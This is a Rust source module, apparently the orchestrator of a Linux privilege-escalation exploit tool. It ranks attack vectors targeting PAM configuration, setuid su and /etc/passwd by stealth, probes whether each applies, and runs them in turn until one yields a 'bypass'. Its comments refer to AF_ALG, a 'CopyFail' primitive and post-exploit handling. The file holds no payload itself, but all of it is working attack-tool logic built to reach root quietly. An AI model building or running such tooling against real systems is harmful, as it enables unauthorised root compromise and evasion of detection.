// S4 orchestrator. Pure logic for vector selection, ranking, and the
// fallback chain. No execve, no syscalls, no_std-compatible.
//
// The Vector trait (defined in lib.rs) returns `Result<bool, Error>` for
// applicability and `Result<(), Error>` for execution. Vectors that succeed
// via execve never return; a vector that returns `Ok(())` (e.g. PAM) is
// treated as "bypass active, caller handles post-exploit".
//
// Ranking is stealth-only because applicability is binary in the current
// trait. Confidence labels are surfaced at this layer for `--vector list`
// output and the JSON schema; they are static per vector name.

use crate::{Error, Vector};
use heapless::Vec as HVec;

const MAX_VECTORS: usize = 8;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    Low,
    Medium,
    High,
}

impl Confidence {
    pub fn as_str(self) -> &'static str {
        match self {
            Confidence::Low => "low",
            Confidence::Medium => "medium",
            Confidence::High => "high",
        }
    }
}

#[derive(Debug, Clone, Copy)]
pub struct VectorMeta {
    pub name: &'static str,
    pub stealth: u8,
    pub confidence: Confidence,
    pub evidence: &'static str,
}

pub fn meta_for(name: &str) -> Option<VectorMeta> {
    match name {
        "pam" => Some(VectorMeta {
            name: "pam",
            stealth: 3,
            confidence: Confidence::High,
            evidence: "/etc/pam.d/{common,system}-auth present, mutable auth line found",
        }),
        "su" => Some(VectorMeta {
            name: "su",
            stealth: 2,
            confidence: Confidence::High,
            evidence: "/usr/bin/su present, setuid root, payload primable",
        }),
        "passwd" => Some(VectorMeta {
            name: "passwd",
            stealth: 1,
            confidence: Confidence::Medium,
            evidence: "/etc/passwd readable, current uid in 1000..=9999",
        }),
        _ => None,
    }
}

pub fn stealth_of(name: &str) -> u8 {
    meta_for(name).map(|m| m.stealth).unwrap_or(0)
}

pub fn confidence_of(name: &str) -> Confidence {
    meta_for(name)
        .map(|m| m.confidence)
        .unwrap_or(Confidence::Low)
}

// Indices into `vectors`, sorted by stealth DESC. Stable for equal stealth
// (preserves input order so tests are deterministic).
fn rank_indices(vectors: &[&dyn Vector]) -> HVec<usize, MAX_VECTORS> {
    let mut idxs: HVec<usize, MAX_VECTORS> = HVec::new();
    for i in 0..vectors.len() {
        let _ = idxs.push(i);
    }
    // Insertion sort, stable, no-alloc, n is tiny.
    for i in 1..idxs.len() {
        let mut j = i;
        while j > 0 && stealth_of(vectors[idxs[j]].name()) > stealth_of(vectors[idxs[j - 1]].name())
        {
            idxs.swap(j, j - 1);
            j -= 1;
        }
    }
    idxs
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct PlanEntry {
    pub name: &'static str,
    pub stealth: u8,
    pub confidence: Confidence,
    pub applicable: bool,
    pub probe_error: bool,
    pub evidence: &'static str,
}

pub fn build_plan(vectors: &[&dyn Vector]) -> HVec<PlanEntry, MAX_VECTORS> {
    let mut out: HVec<PlanEntry, MAX_VECTORS> = HVec::new();
    let order = rank_indices(vectors);
    for &i in order.iter() {
        let v = vectors[i];
        let m = meta_for(v.name()).unwrap_or(VectorMeta {
            name: v.name(),
            stealth: 0,
            confidence: Confidence::Low,
            evidence: "",
        });
        let (applicable, probe_error) = match v.applicable() {
            Ok(true) => (true, false),
            Ok(false) => (false, false),
            Err(_) => (false, true),
        };
        let _ = out.push(PlanEntry {
            name: m.name,
            stealth: m.stealth,
            confidence: m.confidence,
            applicable,
            probe_error,
            evidence: m.evidence,
        });
    }
    out
}

// Pick the first applicable vector in stealth-DESC order. Returns the
// index into the input slice so callers can dispatch the right &dyn Vector.
pub fn select_vector(vectors: &[&dyn Vector]) -> Option<usize> {
    let order = rank_indices(vectors);
    for &i in order.iter() {
        if matches!(vectors[i].applicable(), Ok(true)) {
            return Some(i);
        }
    }
    None
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AttemptOutcome {
    Skipped,    // applicable() returned Ok(false)
    ProbeError, // applicable() returned Err(_)
    ExecuteOk,  // execute() returned Ok(()) — bypass active
    ExecuteErr, // execute() returned Err(_)
}

#[derive(Debug, Clone, Copy)]
pub struct Attempt {
    pub name: &'static str,
    pub outcome: AttemptOutcome,
}

#[derive(Debug)]
pub struct RunReport {
    pub success: Option<&'static str>,
    pub attempts: HVec<Attempt, MAX_VECTORS>,
}

impl RunReport {
    pub fn any_failure(&self) -> bool {
        self.attempts.iter().any(|a| {
            matches!(
                a.outcome,
                AttemptOutcome::ExecuteErr | AttemptOutcome::ProbeError
            )
        })
    }
}

// Try every applicable vector in stealth order. Stops at first ExecuteOk.
// `runner` is the caller-supplied execute step; production wires it to
// v.execute(&mut prim), tests pass a mock closure to avoid AF_ALG.
pub fn try_all_with<F>(vectors: &[&dyn Vector], mut runner: F) -> RunReport
where
    F: FnMut(&dyn Vector) -> Result<(), Error>,
{
    let order = rank_indices(vectors);
    let mut attempts: HVec<Attempt, MAX_VECTORS> = HVec::new();
    for &i in order.iter() {
        let v = vectors[i];
        match v.applicable() {
            Ok(true) => {
                let name = v.name();
                match runner(v) {
                    Ok(()) => {
                        let _ = attempts.push(Attempt {
                            name,
                            outcome: AttemptOutcome::ExecuteOk,
                        });
                        return RunReport {
                            success: Some(name),
                            attempts,
                        };
                    }
                    Err(_) => {
                        let _ = attempts.push(Attempt {
                            name,
                            outcome: AttemptOutcome::ExecuteErr,
                        });
                    }
                }
            }
            Ok(false) => {
                let _ = attempts.push(Attempt {
                    name: v.name(),
                    outcome: AttemptOutcome::Skipped,
                });
            }
            Err(_) => {
                let _ = attempts.push(Attempt {
                    name: v.name(),
                    outcome: AttemptOutcome::ProbeError,
                });
            }
        }
    }
    RunReport {
        success: None,
        attempts,
    }
}

// Spec exit codes:
//   0 success
//   1 generic error           (caller-supplied, e.g., CopyFail::new failed)
//   2 authorization missing   (caller-handled before orchestrator runs)
//   3 host not vulnerable     (caller-handled before orchestrator runs)
//   4 all vectors failed or inapplicable
//   5 partial success         (success but --strict and at least one prior failure)
pub fn exit_code_for(report: &RunReport, strict: bool) -> i32 {
    match report.success {
        Some(_) if strict && report.any_failure() => 5,
        Some(_) => 0,
        None => 4,
    }
}
